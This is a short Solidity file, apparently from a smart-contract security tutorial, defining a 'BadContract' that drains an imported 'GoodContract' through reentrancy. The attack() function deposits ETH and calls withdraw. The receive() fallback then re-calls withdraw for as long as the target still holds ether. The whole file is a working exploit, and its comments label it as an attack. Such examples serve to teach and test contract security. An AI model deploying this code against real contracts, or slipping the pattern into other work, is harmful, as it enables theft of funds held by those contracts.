// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./GoodContract.sol";

contract BadContract {

    GoodContract public goodContract;

    // sets the address of GoodContract and initializes an instance of it.
    constructor(address _goodContractAddress) {
        goodContract = GoodContract(_goodContractAddress);
    }

    // Function to receive Ether
    receive() external payable {
        if(address(goodContract).balance > 0) {
            goodContract.withdraw();
        }
    }

    // Starts the attack
    //  takes some ETH from the attacker, deposits it into GoodContract, and then calls the withdraw function in GoodContract.
    function attack() public payable {
        goodContract.addBalance{value: msg.value}();
        goodContract.withdraw();
    }
}